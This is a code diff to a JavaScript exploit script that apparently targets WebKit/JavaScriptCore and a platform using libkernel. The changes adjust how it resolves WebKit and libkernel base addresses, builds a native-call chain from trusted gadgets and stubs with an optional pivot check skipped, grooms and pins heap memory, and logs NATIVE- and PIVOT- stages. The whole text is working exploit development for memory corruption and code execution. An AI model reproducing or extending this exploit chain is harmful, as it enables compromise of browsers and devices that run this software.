@@ -41,9 +41,10 @@ import {
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
+import { initNativeCall } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829v";
+const BUILD_ID = "rw-20250829w";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -120,6 +121,7 @@ let scanPivotStop = false;
 let scanQuiet = false;
 let scanRenderPending = 0;
 let lkQuiet = false;
+let nativeQuiet = false;
 const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
 const _scanBytes = new Array(8);
 const _win16 = new Array(16);
@@ -142,6 +144,13 @@ function mark(tag, detail) {
         if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE)/.test(tag)) {
             lines.push(line);
             if (lines.length > 40) lines.splice(0, lines.length - 40);
+        }
+        return;
+    }
+    if (nativeQuiet) {
+        if (/^NATIVE-|^PIVOT-|^BASES|^STUBS|^ERROR/.test(tag)) {
+            lines.push(line);
+            if (lines.length > 24) lines.splice(0, lines.length - 24);
         }
         return;
     }
@@ -2083,17 +2092,25 @@ async function doNativeCallImmediate() {
     }
     mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase
         + " promoted=" + pairStatus.promoted);
-    mark("NATIVE-STEP", "init chain…");
-    const { initNativeCall } = await import("./native_call.js");
-    const chain = initNativeCall(p, off, {
-        webkitBase,
-        nativeFn,
-        libkernelBase,
-        log: mark,
-        trustGadgets: true,
-        noStubScan: true,
-        getpidOnly: true,
-    });
+    const lkForced = sessionStorage.getItem("wk-libkernelForced") === "1";
+    nativeQuiet = true;
+    mark("NATIVE-STEP", "init chain… build=" + BUILD_ID);
+    let chain;
+    try {
+        chain = initNativeCall(p, off, {
+            webkitBase,
+            nativeFn,
+            libkernelBase,
+            log: mark,
+            trustGadgets: true,
+            trustStubs: true,
+            noStubScan: true,
+            skipPivotVerify: pivotReady,
+            getpidOnly: true,
+        });
+    } finally {
+        nativeQuiet = false;
+    }
     nativeChain = chain;
     try {
         sessionStorage.setItem("wk-libkernelBase", String(libkernelBase));
@@ -2113,8 +2130,12 @@ async function freeBeforeNative() {
     stripUiForNative();
     retained.length = 0;
     pointers.length = 0;
+    raceBuf.length = 0;
+    if (lines.length > 24) lines.splice(0, lines.length - 24);
+    if (outEl) outEl.textContent = lines.join("\n");
     mark("NATIVE-PREP", "ui trimmed — groom stays pinned");
     exploit = null;
+    try { crashLog.flushSync(); } catch (_) { }
 }
 
 function seedNativeSession(p, off) {
